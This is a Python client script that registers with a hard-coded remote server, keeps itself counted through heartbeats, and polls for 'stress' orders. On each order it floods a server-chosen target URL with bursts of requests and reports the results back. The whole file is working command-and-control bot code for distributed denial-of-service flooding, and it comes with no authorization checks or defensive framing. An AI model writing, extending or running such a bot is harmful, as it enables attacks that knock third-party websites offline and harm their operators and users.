import threading
import time
import uuid
import requests

SERVER = "https://te-l1hl.onrender.com"
CLIENT_ID = f"w-{uuid.uuid4().hex[:6]}"

POLL_INTERVAL = 2.0
HEARTBEAT_INTERVAL = 3.0   # separate keep-alive so count stays fresh while idle


def report(msg):
    try:
        requests.post(f"{SERVER}/api/report", json={"id": CLIENT_ID, "msg": msg}, timeout=5)
    except Exception:
        pass


def heartbeat():
    """keep the client counted as alive even while not polling"""
    while True:
        try:
            requests.post(f"{SERVER}/api/register", json={"id": CLIENT_ID}, timeout=5)
        except Exception:
            pass
        time.sleep(HEARTBEAT_INTERVAL)


def stress_once(target, rate, window, cooldown):
    delay = window / max(rate, 1)
    ok, fail = 0, 0
    for _ in range(rate):
        try:
            requests.get(target, timeout=5)
            ok += 1
        except Exception:
            fail += 1
        time.sleep(delay)
    report(f"burst done to {target}: ok={ok} fail={fail} | cooling {cooldown}s")
    time.sleep(cooldown)


def main_loop():
    report(f"alive as {CLIENT_ID}")
    while True:
        try:
            r = requests.post(f"{SERVER}/api/poll", json={"id": CLIENT_ID}, timeout=5).json()
            if r.get("action") == "stress":
                report(f"received stress order -> {r['target']}")
                stress_once(
                    r["target"],
                    r.get("rate", 10),
                    r.get("window", 3.0),
                    r.get("cooldown", 10.0),
                )
            else:
                time.sleep(POLL_INTERVAL)
        except Exception as e:
            report(f"poll error: {e}")
            time.sleep(POLL_INTERVAL)


if __name__ == "__main__":
    threading.Thread(target=heartbeat, daemon=True).start()
    main_loop()
